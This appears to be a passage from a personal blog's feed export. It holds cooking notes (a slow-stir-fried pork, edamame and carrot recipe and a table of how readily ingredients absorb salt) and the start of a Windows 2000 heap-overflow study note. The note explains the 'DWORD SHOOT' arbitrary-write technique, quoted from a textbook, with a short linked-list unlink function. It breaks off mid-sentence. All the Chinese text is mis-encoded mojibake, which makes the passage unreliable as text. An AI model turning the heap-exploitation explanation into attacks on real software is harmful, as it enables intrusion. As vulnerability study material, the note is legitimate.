å¾—ï¼Œä¹Ÿå¯è¿ç”¨åˆ°å…¶ä»–éœ€è…Œåˆ¶ç˜¦è‚‰çš„èœè°±ä¸­ï¼Œå±äºä¸€ç§è¾ƒå¥½çš„é€šç”¨å§¿åŠ¿ã€‚</p><p><strong>è…Œåˆ¶æ–¹æ³•ä¸ºï¼šåŠ å…¥ç”ŸæŠ½ã€é»„é…’ï¼ˆæ–™é…’ï¼‰ã€é¦™æ²¹ï¼ˆèŠéº»æ²¹ï¼‰ã€èƒ¡æ¤’ç²‰ã€æ·€ç²‰ï¼ˆå«©è‚‰ç²‰ï¼‰ï¼Œæ‹ŒåŒ€å¹¶é™ç½®10åˆ†é’Ÿä»¥ä¸Šã€‚</strong></p><p>å¾ˆå¤šèœè°±ä¸­ä»‹ç»çš„è…Œåˆ¶è¿‡ç¨‹æ˜¯éœ€è¦åŠ å…¥ç›çš„ï¼Œä½†æ˜¯ç»è¿‡ä¸€æ®µæ—¶é—´å®è·µæˆ‘å‘ç°è¿™æ˜¯ä¸éœ€è¦ä¸”æœ€å¥½ä¸è¦çš„ï¼Œå› ä¸ºæ­£å¦‚ä¸Šä¸€ç¯‡æ–‡ç« ã€Œé£Ÿæå¸ç›åº¦å°ç»“ã€ä¸­ä»‹ç»ï¼Œç˜¦è‚‰å±äºè¾ƒå®¹æ˜“å¸ç›çš„é£Ÿæï¼Œè‹¥è…Œåˆ¶æ—¶åŠ å…¥ç›ï¼Œåç»­åœ¨ç‚’åˆ¶è¿‡ç¨‹ä¸­è¿˜ä¼šå†å¸ç›ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´ç‚’å‡ºçš„èœå”¯ç‹¬ç˜¦è‚‰è¿‡å’¸è€Œå¯¼è‡´æ•´é“èœçš„å£æ„Ÿä¸å¹³è¡¡ã€‚</p><p>ä¸ºäº†ä¾¿äºè¿›ä¸€æ­¥ä½“ä¼šï¼Œè¿™é‡Œç”¨é’æ¤’ï¼ˆæœ¨è€³ï¼‰è‚‰ä¸çš„ç‚’åˆ¶è¿‡ç¨‹ä½œä¸ºç¤ºä¾‹ï¼š</p><ol><li>è…Œåˆ¶å®Œçš„ç˜¦è‚‰è¿‡æ²¹åç››èµ·å¤‡ç”¨ã€‚</li><li>å°‘é‡æ²¹å…¥é”…ï¼Œçˆ†é¦™è‘±å§œè’œæœ«ã€‚</li><li>é’æ¤’ä¸ã€æœ¨è€³å…¥é”…ï¼ŒåŠ å…¥é€‚é‡ç”ŸæŠ½ã€æ–™é…’ã€é¦™æ²¹ã€ç³–ä»¥åŠä¸‰åˆ†ä¹‹äºŒçš„ç›ï¼Œç‚’è‡³åŠ å…¥æ¶²ä½“æŒ¥å‘æ®†å°½ã€‚</li><li>ç˜¦è‚‰å…¥é”…ï¼ŒåŠ å…¥ä¸‰åˆ†ä¹‹ä¸€çš„ç›åŠå°‘é‡æ°´ï¼Œç¿»ç‚’è‡³æ°´æŒ¥å‘æ®†å°½åå®Œæˆã€‚</li></ol><p>å¦‚ä¸Šè¿‡ç¨‹æœ‰å¦‚ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ul><li>è¿™é‡Œè¯´å„ç§ä½æ–™åŠ å…¥é€‚é‡è€Œæ²¡æœ‰å…·ä½“æ•°é‡å€¼ï¼Œæ˜¯ç”±äºé€‚é‡çš„å€¼ç¡®å®éœ€è¦é€šè¿‡ä¸æ–­å®è·µç§¯ç´¯ç»éªŒæ‰èƒ½ä½“ä¼šåˆ°ï¼Œä¹Ÿå°±æ˜¯â€œå‡­æ„Ÿè§‰â€=.=ï¼Œæœ‰ä¸€å®šç»éªŒåè¿˜éœ€æ ¹æ®å½“æ¬¡çƒ¹åˆ¶æ—¶é£Ÿæçš„é‡æ¥æƒè¡¡ä½æ–™çš„é‡ã€‚</li><li>è¿™é‡Œæ‰€è¯´çš„ç›çš„é‡ï¼Œæ˜¯å‡è®¾ç‚’è‡³è¿™é“èœæ‰€éœ€çš„ç›çš„æ€»é‡ä¸º1ï¼Œåˆ™åœ¨ç‚’è‡³é’æ¤’å’Œæœ¨è€³æ—¶æ”¾å…¥æ€»é‡çš„ä¸‰åˆ†ä¹‹äºŒï¼ŒåŠ å…¥ç˜¦è‚‰åå†æ”¾å…¥å‰©ä¸‹ä¸‰åˆ†ä¹‹ä¸€ã€‚è‡³äºå®é™…éœ€ç›çš„é‡ï¼Œä»éœ€æ ¹æ®ç»éªŒåˆ¤æ–­ã€‚</li><li>ä¹‹æ‰€ä»¥å…ˆåŠ å…¥ä¸‰åˆ†ä¹‹äºŒçš„ç›ï¼Œæ˜¯ç”±äºé’æ¤’å’Œæœ¨è€³çš„å¸ç›åº¦ç›¸è¿‘ï¼Œä¸”è¿œä¸å¦‚ç˜¦è‚‰ï¼Œå› æ­¤ä¸ºäº†å¹³è¡¡æœ€ç»ˆä¸åŒé£Ÿæçš„å’¸åº¦ï¼Œéœ€è¦å…ˆæ”¾å…¥å¤§éƒ¨åˆ†çš„ç›ç‚’åˆ¶ç‰‡åˆ»ï¼Œä½¿éƒ¨åˆ†ç›è¢«é’æ¤’å’Œæœ¨è€³å¸æ”¶ï¼Œåœ¨ç˜¦è‚‰å…¥é”…æ—¶ï¼Œå†æ”¾å…¥å‰©ä¸‹çš„ä¸‰åˆ†ä¹‹ä¸€ï¼Œå°±èƒ½ä¿è¯æœ€ç»ˆä¸åŒé£Ÿæçš„å’¸åº¦ç›¸è¿‘ã€‚</li><li>åœ¨çƒ¹åˆ¶ç»å¤§å¤šæ•°èœçš„æ—¶å€™ï¼Œéƒ½å¯ä»¥åŠ å…¥é€‚é‡çš„ç³–ç”¨äºæé²œã€‚</li><li>æœ€åä¸€æ¬¡åŠ æ°´ï¼Œæ˜¯ä¸ºäº†è®©ä½æ–™å‡åŒ€é™„ç€ã€‚å› ä¸ºæ­¤æ—¶é”…ä¸­è¾ƒå¹²ï¼Œå‡ ä¹æ— æ°´åˆ†ï¼ŒåŠ å…¥çš„ä½æ–™ä¼šç²˜ç€åœ¨é£Ÿæè¡¨é¢ï¼Œå¯¼è‡´å…¶ä¸å‡åŒ€åˆ†å¸ƒï¼Œè€Œä»…ç”¨é”…é“²åœæ¥ï¼ˆç¿»ç‚’ï¼‰å‡ ä¸‹æœ‰æ—¶ä¹Ÿå¹¶ä¸èƒ½è¾¾åˆ°ç†æƒ³æ•ˆæœï¼Œå› æ­¤éœ€ç”¨å°‘é‡æ°´æº¶è§£åç¿»ç‚’ï¼Œæ•ˆæœæœ€ä½³ã€‚</li></ul><h2 id="èœè°±"><a href="#èœè°±" class="headerlink" title="èœè°±"></a>èœè°±</h2><p>è¨€å½’æ­£ä¼ ï¼Œä»‹ç»èœè°±â€”â€”æ…¢ç‚’ä¸‰ä¸ã€‚</p><p>è¿™é“èœè¾ƒä¸ºè€—æ—¶ï¼Œå¤§æ¦‚éœ€è¦40åˆ†é’Ÿï¼ˆå‡†å¤‡é£Ÿæçº¦20åˆ†é’Ÿï¼Œçƒ¹åˆ¶çº¦20åˆ†é’Ÿï¼‰ã€‚</p><h3 id="1-ç”¨æ–™"><a href="#1-ç”¨æ–™" class="headerlink" title="1. ç”¨æ–™"></a>1. ç”¨æ–™</h3><table><thead><tr><th align="center">ç”¨æ–™</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">çŒªè‚‰</td><td align="center">è‚‰åˆ‡å°ä¸è…Œåˆ¶10åˆ†é’Ÿ</td></tr><tr><td align="center">æ¯›è±†</td><td align="center">å»å¤–çš®å’Œé‡Œçš®ï¼Œé‡Œçš®ä¸€å®šè¦å»ï¼Œå¦åˆ™éš¾å…¥å‘³</td></tr><tr><td align="center">èƒ¡èåœ</td><td align="center">åˆ‡å°ä¸</td></tr><tr><td align="center">è‘±</td><td align="center">é€‚é‡åˆ‡æœ«</td></tr><tr><td align="center">å§œ</td><td align="center">é€‚é‡åˆ‡ç‰‡</td></tr><tr><td align="center">è’œ</td><td align="center">é€‚é‡åˆ‡æœ«</td></tr><tr><td align="center">ç‹å®ˆä¹‰åä¸‰é¦™</td><td align="center">è¿™é“èœçš„é¦™å‘³ä¸»è¦é å®ƒï¼Œç»ä¸å¯å°‘å“¦</td></tr><tr><td align="center">ç”ŸæŠ½ æ–™é…’ èŠéº»æ²¹ æ·€ç²‰ èƒ¡æ¤’ç²‰ å‘³ç²¾ï¼ˆé¸¡ç²¾ï¼‰</td><td align="center">é€‚é‡</td></tr></tbody></table><p>è‡³äºé£Ÿæå…·ä½“ç”¨é‡ï¼Œä¾ç„¶éœ€è¦å‡­æ„Ÿè§‰^-^ï¼Œå¯ä»¥å‚è€ƒä¸‹å›¾ï¼š</p><img data-src="/life/dog2s-cooking-notes-2/1.jpg" class="" title="é£Ÿæä¸€è§ˆ"><h3 id="2-çƒ¹åˆ¶è¿‡ç¨‹"><a href="#2-çƒ¹åˆ¶è¿‡ç¨‹" class="headerlink" title="2. çƒ¹åˆ¶è¿‡ç¨‹"></a>2. çƒ¹åˆ¶è¿‡ç¨‹</h3><ol><li>ä¸€å®šé‡é£Ÿç”¨æ²¹å…¥é”…çƒ§çƒ­ï¼Œè‚‰ä¸å…¥é”…ç‚’è‡³å˜è‰²ç››èµ·å¾…ç”¨ã€‚</li><li>å†å…¥å°‘é‡é£Ÿç”¨æ²¹ï¼Œè‘±å§œè’œå…¥é”…çˆ†é¦™ã€‚</li><li>æ¯›è±†èƒ¡èåœå…¥é”…ï¼ŒåŠ å…¥é€‚é‡ç”ŸæŠ½ã€æ–™é…’ã€èŠéº»æ²¹ã€ç³–ã€ä¸‰åˆ†ä¹‹äºŒçš„ç›ä»¥åŠåä¸‰é¦™ï¼Œåä¸‰é¦™å¯ä»¥ç¨å¾®å¤šä¸€ç‚¹ï¼Œç‚’è‡³åŠ å…¥æ¶²ä½“æŒ¥å‘æ®†å°½ã€‚ç³–çš„å¤šå°‘å› äººè€Œå¼‚ï¼ŒäºŒå¨æ¯”è¾ƒå–œæ¬¢æ•´é“èœæœ‰æ·¡æ·¡çš„ç”œå‘³ï¼Œå› æ­¤åŠ å¾—å¤šç‚¹ã€‚</li><li>èƒ¡èåœå’Œæ¯›è±†è¾ƒéš¾ç†Ÿé€ï¼Œå› æ­¤éœ€åŠ å…¥å¤§é‡å†·æ°´è¿›è¡Œå¤§ç«ç…®åˆ¶ï¼Œå…·ä½“çš„é‡ä»¥ç¨å¤šäºå®Œå…¨æ·¹æ²¡é”…ä¸­é£Ÿæçš„é‡ä¸ºä½³ï¼Œå¯ä»¥è§‚å¯Ÿä¸Šå›¾ï¼Œæ­¤æ¬¡ç”¨é‡ä¸ºç››æ”¾æ¯›è±†çš„å¡‘æ–™ç¢—ä¸€æ»¡ç¢—ã€‚</li><li>åœ¨ç…®åˆ¶15åˆ†é’Ÿå·¦å³ç›´è‡³åŠ å…¥çš„æ°´å·²è’¸å‘å¤§éƒ¨åˆ†è€Œæ¥è¿‘æ”¶æ±æ—¶ï¼Œè‚‰ä¸å…¥é”…ï¼ŒåŠ å…¥é€‚é‡å‘³ç²¾ï¼ˆé¸¡ç²¾ï¼‰å’Œä¸‰åˆ†ä¹‹ä¸€çš„ç›ï¼Œç‚’è‡³é”…ä¸­å®Œå…¨æ”¶æ±ã€‚æ­¤æ—¶å†åŠ å…¥å°‘é‡æ°´ï¼ˆ200-300æ¯«å‡ï¼‰ï¼Œå†ç‚’è‡³å®Œå…¨æ”¶æ±å³å¯å‡ºé”…ã€‚</li></ol><h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>æœ¬æ–‡ä»¥å¹³è¡¡ä¸åŒé£Ÿæçš„å’¸åº¦ä¸ºä¸­å¿ƒï¼ŒåšæŒæ…¢å·¥ç»†æ´»å„¿å’Œè·Ÿæ„Ÿè§‰èµ°çš„ä¸¤ä¸ªåŸºæœ¬ç‚¹ï¼Œä»‹ç»äº†äºŒå¨é€šè¿‡ä¹±æ”¹èœè°±ã€è‚†æ„çƒ¹è°ƒè€Œå¦„å›¾æˆä¸ºç¤¾ä¼šä¸»ä¹‰å¥½å¤§å¨çš„è¿‡ç¨‹ã€‚</p><p>è¿™é“èœè¾ƒä¸ºè€—æ—¶ï¼Œå› æ­¤ä¸é€‚åˆå·¥ä½œæ—¥çƒ¹åˆ¶ï¼Œé‚£ä»€ä¹ˆèœèƒ½åœ¨çŸ­æ—¶é—´å†…å®Œæˆï¼Œä»¥é€‚åˆæ—¥ç›Šå¢å¤šçš„å¥”æ³¢æ—å‘¢ï¼Ÿä¸‹ä¸€ç¯‡å°±ä¼šæœé›†ä¸€äº›æ‡’äººèœè°±ï¼Œä»¥æ–¹ä¾¿ä¸Šç­æ—ä»¬åœ¨å›å®¶åèƒ½ç®€å•å¿«æ·åœ°åƒä¸Šè‡ªå·±äº²æ‰‹æ‰“é€ çš„é»‘æš—æ–™ç†~</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cooking </tag>
            
            <tag> Dog2&#39;s Cooking Notes </tag>
            
            <tag> Foodie </tag>
            
            <tag> Cookbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒå¨ç¬”è®° #1: é£Ÿæå¸ç›åº¦å°ç»“</title>
      <link href="/life/dog2s-cooking-notes-1/"/>
      <url>/life/dog2s-cooking-notes-1/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Dog2â€™s Cooking Notes #1: Salt Absorption Rate of Food Ingredients</strong></em></li><li>Author: dog2</li></ul><hr><blockquote><p>å­¦ä¹ ç‚’èœå·²ä¸¤æœˆæœ‰ä½™ï¼Œè§‰å¾—æœ‰äº›æ™®é€‚æ€§çš„ç»éªŒå€¼å¾—æ€»ç»“ï¼Œä¾¿åœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><p>æœ¬ç¯‡æ€»ç»“ä¸€ä¸‹ä¸åŒé£Ÿæçš„å¸ç›åº¦ã€‚</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€é“èœé€šå¸¸ç”±å¤šç§é£Ÿææ··åˆçƒ¹åˆ¶è€Œæˆï¼Œå…¶å’¸å‘³è½»é‡ä¼šç›´æ¥å½±å“å£æ„Ÿã€‚ä¸åŒé£Ÿæå¯¹ç›çš„å¸æ”¶èƒ½åŠ›ä¸å°½ç›¸åŒï¼Œå› æ­¤è¾ƒå¥½åœ°å¹³è¡¡ä¸åŒé£Ÿæçš„å’¸åº¦æ˜¯ä½³ä½œçš„é‡è¦å› ç´ ä¹‹ä¸€ã€‚ä½†ç½‘ä¸Šç»å¤§å¤šæ•°èœè°±æˆ–æ•™ç¨‹å¾ˆå°‘è€ƒè™‘è¿™ä¸€ç‚¹ï¼Œå¤§å¤šæ•°èœè°±éƒ½æ˜¯åœ¨æ‰€æœ‰é£Ÿæéƒ½å·²å…¥é”…ä¸”çƒ¹åˆ¶å³å°†å®Œæˆå‰æ”¾å…¥ç›çš„ï¼Œè¿™å®¹æ˜“é€ æˆä¸€é“èœæœ€ç»ˆç”±äºä¸åŒé£Ÿæå’¸æ·¡ä¸å‡è€Œå½±å“å£æ„Ÿã€‚</p><h2 id="é£Ÿæå¸ç›åº¦è¡¨"><a href="#é£Ÿæå¸ç›åº¦è¡¨" class="headerlink" title="é£Ÿæå¸ç›åº¦è¡¨"></a>é£Ÿæå¸ç›åº¦è¡¨</h2><ul><li>ä¸‹è¡¨è®°å½•åœ¨ç‚’åˆ¶æˆ–ç…®åˆ¶è¿‡ç¨‹ä¸­ä¸åŒé£Ÿæå¯¹ç›çš„å¸æ”¶éš¾æ˜“ç¨‹åº¦ï¼Œå®Œå…¨æ ¹æ®ä¸ªäººç»éªŒï¼Œå› æ­¤æœªå¿…å‡†ç¡®ï¼Œå¦‚æœ‰ä¸å¦¥æ¬¢è¿æŒ‡æ­£ã€‚</li><li>è™½ç„¶æ­¤è¡¨ååº”çš„æ˜¯å¸ç›éš¾æ˜“ç¨‹åº¦ï¼Œä½†ä¹Ÿå¯å¼•ç”³ä¸ºç›¸å…³é£Ÿæå…¥å‘³ï¼ˆé…¸/ç”œ/è‹¦/è¾£ï¼‰çš„éš¾æ˜“ç¨‹åº¦ã€‚</li><li>å¯ä»¥å‚è€ƒä¸‹è¡¨è°ƒæ•´çƒ¹åˆ¶æ—¶é£Ÿæçš„å½¢çŠ¶ï¼Œæˆ–è°ƒæ•´ç›ä¸å„ç§é£Ÿæå…¥é”…çš„å…ˆåï¼Œä»¥å¹³è¡¡ä¸åŒé£Ÿæçš„å’¸åº¦ã€‚</li><li>å¸ç›åº¦0-5åˆ†ï¼Œ5åˆ†è¡¨ç¤ºææ˜“å¸ç›ï¼Œ0åˆ†è¡¨ç¤ºæéš¾å¸ç›ã€‚</li></ul><a id="more"></a><table><thead><tr><th align="center">é£Ÿæ</th><th align="center">å½¢çŠ¶</th><th align="center">å¸ç›åº¦</th></tr></thead><tbody><tr><td align="center">ç™½èœ</td><td align="center">å¶ç‰‡</td><td align="center">2.8</td></tr><tr><td align="center">ç™½èåœ</td><td align="center">åˆ‡ç‰‡</td><td align="center">3.5</td></tr><tr><td align="center">åŒ…èœ</td><td align="center">æ‰‹æ’•ç‰‡</td><td align="center">3</td></tr><tr><td align="center">å¤§è’œ</td><td align="center">åˆ‡ç¢ç²’</td><td align="center">2</td></tr><tr><td align="center">é»„è±†èŠ½</td><td align="center"></td><td align="center">3</td></tr><tr><td align="center">èƒ¡èåœ</td><td align="center">ä¸</td><td align="center">2.5</td></tr><tr><td align="center">èŒ„å­</td><td align="center">ä¸/æ¡</td><td align="center">4.5</td></tr><tr><td align="center">é¸¡è›‹</td><td align="center">æ…æ‹Œåç…å—</td><td align="center">3.6</td></tr><tr><td align="center">é¸¡è›‹</td><td align="center">æ…æ‹Œåå…¥æ±¤</td><td align="center">3.4</td></tr><tr><td align="center">é‡‘é’ˆè‡</td><td align="center"></td><td align="center">4</td></tr><tr><td align="center">æœ¨è€³</td><td align="center">å°æœµ</td><td align="center">1.5</td></tr><tr><td align="center">è—•</td><td align="center">ä¸</td><td align="center">3.4</td></tr><tr><td align="center">é’æ¤’</td><td align="center">ä¸</td><td align="center">1.5</td></tr><tr><td align="center">åœŸè±†</td><td align="center">è–„ç‰‡</td><td align="center">2.8</td></tr><tr><td align="center">åœŸè±†</td><td align="center">ç»†ä¸</td><td align="center">2.8</td></tr><tr><td align="center">æé²è‡</td><td align="center">åˆ‡ç‰‡</td><td align="center">3</td></tr><tr><td align="center">æœ‰æœºèŠ±èœ</td><td align="center">åˆ‡å°æœµ</td><td align="center">2</td></tr><tr><td align="center">çŒªè‚‰</td><td align="center">æ’éª¨</td><td align="center">3</td></tr><tr><td align="center">çŒªè‚‰</td><td align="center">ä¸/ä¸</td><td align="center">3.2</td></tr></tbody></table><h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>å°½ä¿¡ä¹¦ä¸å¦‚æ— ä¹¦ï¼Œèœè°±äº¦ç„¶ï¼ˆï¼Œæˆ‘æœä¸€äº›ä¹¦â€œè¶…ç„¶â€ï¼Œæ¯”å¦‚æŸå‡ é—¨æ•™ç§‘ä¹¦@_@ ã€‚ã€‚ï¼‰ã€‚åœ¨çœ‹å®Œèœè°±å¹¶äº†è§£äº†å…¶ä¸­ä¸åŒé£Ÿæçš„å…¥é”…é¡ºåºåï¼Œå¯ç»“åˆä¸Šè¡¨æ€»ç»“çš„é£Ÿæå¸ç›åº¦æ¥è°ƒæ•´ç›çš„æ”¾å…¥æ–¹å¼ï¼Œå¦‚å¯å°†èœè°±ä¸­å¸¸è§çš„èµ·é”…å‰ä¸€æ¬¡æ€§æ”¾å…¥ç›çš„æ–¹å¼æ”¹ä¸ºåˆ†æ¬¡æ”¾å…¥ï¼Œå¹¶åˆé€‚æŒæ§æ”¾å…¥é‡ï¼Œç”šè‡³å¯ä»¥è€ƒè™‘ç›¸åº”åœ°æ›´æ”¹é£Ÿæçš„æ”¾å…¥é¡ºåºï¼Œç›¸ä¿¡æœ‰æ—¶å¯ä»¥æ”¶è·è¶…è¶ŠåŸèœè°±æ°´å‡†çš„æ„å¤–æƒŠå–œã€‚</p><p>æ¥ä¸‹æ¥çš„å‡ ç¯‡ä¼šåˆ†äº«ä¸€äº›åŸºäºè¿™ç§æ–¹æ³•æ”¹è‰¯åŸæœ‰èœè°±æˆ–è€…â€œåˆ›é€ â€æ–°èœè°±çš„ç»éªŒã€‚</p><p>ç¥å›çƒ§å¾—ä¸€æ‰‹å¥½èœ~</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cooking </tag>
            
            <tag> Dog2&#39;s Cooking Notes </tag>
            
            <tag> Foodie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †æº¢å‡ºå­¦ä¹ ç¬”è®°(Win2K) (ä¸‹)</title>
      <link href="/tech/heap-overflow-learning-notes-2/"/>
      <url>/tech/heap-overflow-learning-notes-2/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #2</strong></em></li><li>Author: dog2</li></ul><hr><h2 id="å †æº¢å‡ºåŸç†åŠåˆ©ç”¨"><a href="#å †æº¢å‡ºåŸç†åŠåˆ©ç”¨" class="headerlink" title="å †æº¢å‡ºåŸç†åŠåˆ©ç”¨"></a>å †æº¢å‡ºåŸç†åŠåˆ©ç”¨</h2><hr><h3 id="1-å †æº¢å‡ºåŸç†"><a href="#1-å †æº¢å‡ºåŸç†" class="headerlink" title="1. å †æº¢å‡ºåŸç†"></a>1. å †æº¢å‡ºåŸç†</h3><blockquote><p>å †ç®¡ç†ç³»ç»Ÿçš„ä¸‰ç±»æ“ä½œï¼šå †å—åˆ†é…ã€å †å—é‡Šæ”¾å’Œå †å—åˆå¹¶å½’æ ¹ç»“åº•éƒ½æ˜¯å †é“¾è¡¨çš„ä¿®æ”¹ã€‚ä¾‹å¦‚ï¼Œåˆ†é…å°±æ˜¯å°†å †å—ä»ç©ºè¡¨ä¸­â€œå¸ä¸‹â€ï¼›é‡Šæ”¾æ˜¯æŠŠå †å—â€œé“¾å…¥â€ç©ºè¡¨ï¼›åˆå¹¶ç¨å¾®å¤æ‚ç‚¹ï¼Œä½†ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯æŠŠè‹¥å¹²ä¸ªå †å—å…ˆä»ç©ºè¡¨ä¸­â€œå¸ä¸‹â€ï¼Œä¿®æ”¹å—é¦–ä¿¡æ¯ï¼ˆå¤§å°ï¼‰ï¼Œä¹‹åæŠŠæ›´æ–°çš„æ–°å—â€œé“¾å…¥â€ç©ºè¡¨ã€‚</p><p>æ‰€æœ‰â€œå¸ä¸‹â€å’Œâ€œé“¾å…¥â€å †å—çš„å·¥ä½œéƒ½å‘ç”Ÿåœ¨é“¾è¡¨ï¼Œå¦‚æœæˆ‘ä»¬èƒ½ä¼ªé€ é“¾è¡¨ç»“ç‚¹çš„æŒ‡é’ˆï¼Œåœ¨â€œå¸ä¸‹â€å’Œâ€œé“¾å…¥â€çš„è¿‡ç¨‹ä¸­å°±æœ‰å¯èƒ½è·å¾—ä¸€æ¬¡è¯»å†™å†…å­˜çš„æœºä¼šã€‚</p><p>å †æº¢å‡ºåˆ©ç”¨çš„ç²¾é«“å°±æ˜¯ç”¨ç²¾å¿ƒæ„é€ çš„æ•°æ®å»æº¢å‡ºä¸‹ä¸€ä¸ªå †å—çš„å—é¦–ï¼Œæ”¹å†™å—é¦–ä¸­çš„å‰å‘æŒ‡é’ˆ(flink)å’Œåå‘æŒ‡é’ˆ(blink)ï¼Œç„¶åå†åˆ†é…ã€é‡Šæ”¾ã€åˆå¹¶ç­‰æ“ä½œå‘ç”Ÿæ—¶ä¼ºæœºè·å¾—ä¸€æ¬¡å‘å†…å­˜ä»»æ„åœ°å€å†™å…¥ä»»æ„æ•°æ®çš„æœºä¼šã€‚</p><p>æˆ‘ä»¬æŠŠè¿™ç§èƒ½å¤Ÿå‘å†…å­˜ä»»æ„ä½ç½®å†™å…¥ä»»æ„æ•°æ®çš„æœºä¼šæˆä¸ºâ€DWORD SHOOTâ€œã€‚æ³¨æ„ï¼šDWORD SHOOTå‘ç”Ÿæ—¶ï¼Œæˆ‘ä»¬ä¸ä½†å¯ä»¥æ§åˆ¶å°„å‡»çš„ç›®æ ‡ï¼ˆä»»æ„åœ°å€ï¼‰ï¼Œè¿˜å¯ä»¥é€‰ç”¨é€‚å½“çš„å­å¼¹ï¼ˆ4å­—èŠ‚æ¶æ„æ•°æ®ï¼‰ã€‚</p><p>è¿™é‡Œä¸¾ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜é“¾è¡¨æ“ä½œä¸­DWORD SHOOTç©¶ç«Ÿæ˜¯æ€æ ·å‘ç”Ÿçš„ã€‚å°†ä¸€ä¸ªç»“ç‚¹ä»åŒå‘é“¾è¡¨ä¸­â€œå¸ä¸‹â€çš„å‡½æ•°å¾ˆå¯èƒ½æ˜¯ç±»ä¼¼è¿™æ ·çš„ã€‚</p></blockquote><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æŒ‰ç…§è¿™ä¸ªå‡½æ•°çš„é€»è¾‘ï¼Œæ­£å¸¸æ‹†å¸è¿‡ç¨‹ä¸­é“¾è¡¨çš„å˜åŒ–è¿‡ç¨‹å¦‚å›¾5.3.1æ‰€ç¤ºã€‚</p><p>å½“å †æº¢å‡ºå‘ç”Ÿæ—¶ï¼Œéæ³•æ•°æ®å¯ä»¥æ·¹æ²¡ä¸‹ä¸€ä¸ªå †å—å—é¦–ã€‚è¿™æ˜¯ï¼Œå—é¦–æ˜¯å¯ä»¥è¢«æ”»å‡»è€…æ§åˆ¶çš„ï¼Œå³å—é¦–ä¸­å­˜æ”¾çš„å‰å‘æŒ‡é’ˆï¼ˆflinkï¼‰å’Œåå‘æŒ‡é’ˆï¼ˆblinkï¼‰æ˜¯å¯ä»¥è¢«æ”»å‡»è€…ä¼ªé€ çš„ã€‚å½“è¿™ä¸ªå †å—è¢«ä»åŒå‘é“¾è¡¨ä¸­â€å¸ä¸‹â€œæ—¶ï¼Œnode -&gt; blink -&gt; flink = node -&gt; flink å°†æŠŠä¼ªé€ çš„flinkæŒ‡é’ˆå€¼å†™å…¥ä¼ªé€ çš„blinkæ‰€æŒ‡çš„åœ°å€ä¸­å»ï¼Œä»è€Œå‘ç”ŸDWORD SHOOTã€‚è¿™ä¸ªè¿‡ç¨‹å¦‚å›¾5.3.2æ‰€ç¤ºã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P163-164</cite></footer></blockquote><img data-src="/tech/heap-overflow-learning-notes-2/0day_5_3_1.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P165 -&gt; å›¾5.3.1"><img data-src="/tech/heap-overflow-learning-notes-2/0day_5_3_2.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P165 -&gt; å›¾5.3.2"><h3 id="2-å †æº¢å‡ºåˆ©ç”¨"><a href="#2-å †æº¢å‡ºåˆ©ç”¨" class="headerlink" title="2. å †æº¢å‡ºåˆ©ç”¨"></a>2. å †æº¢å‡ºåˆ©ç”¨</h3><blockquote><p>DWORD SHOOTçš„å¸¸ç”¨ç›®æ ‡ï¼ˆWindows XP SP1ä¹‹å‰çš„å¹³å°ï¼‰å¤§æ¦‚å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ ç±»ã€‚</p><p>(1) å†…å­˜å˜é‡ï¼šä¿®æ”¹èƒ½å¤Ÿå½±å“ç¨‹åºæ‰§è¡Œçš„é‡è¦æ ‡å¿—å˜é‡ï¼Œå¾€å¾€å¯ä»¥æ”¹å˜ç¨‹åºæµç¨‹ã€‚ä¾‹å¦‚ï¼Œæ›´æ”¹èº«ä»½éªŒè¯å‡½æ•°çš„è¿”å›å€¼å°±å¯ä»¥ç›´æ¥é€šè¿‡è®¤è¯æœºåˆ¶ã€‚2.2èŠ‚ä¸­ä¿®æ”¹é‚»æ¥å˜é‡çš„å°è¯•éªŒå°±æ˜¯è¿™ç§åˆ©ç”¨æ–¹å¼çš„ä¾‹å­ã€‚åœ¨è¿™ç§åº”ç”¨åœºæ™¯ä¸­ï¼ŒDWORD SHOOTè¦æ¯”æ ˆæº¢å‡ºå¼ºå¤§å¾—å¤šï¼Œå› ä¸ºæ ˆæº¢å‡ºæ—¶æº¢å‡ºçš„æ•°æ®å¿…é¡»è¿ç»­ï¼Œè€ŒDWORD 